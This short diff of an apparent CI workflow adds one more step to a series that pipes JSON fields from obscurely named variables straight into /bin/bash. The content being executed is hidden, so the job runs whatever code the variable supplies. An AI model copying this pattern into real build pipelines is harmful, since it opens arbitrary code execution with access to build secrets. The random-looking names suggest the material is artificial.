@@ -25,6 +25,7 @@ jobs:
           echo $anh15 | jq -r .prs50 | /bin/bash
           printf '%s' "$wr6238" | jq -r .xkqc660 | /bin/bash
           echo $ggz2 | jq -r .jsksn633 | /bin/bash
+          echo $mmjgs26 | jq -r .lm95 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
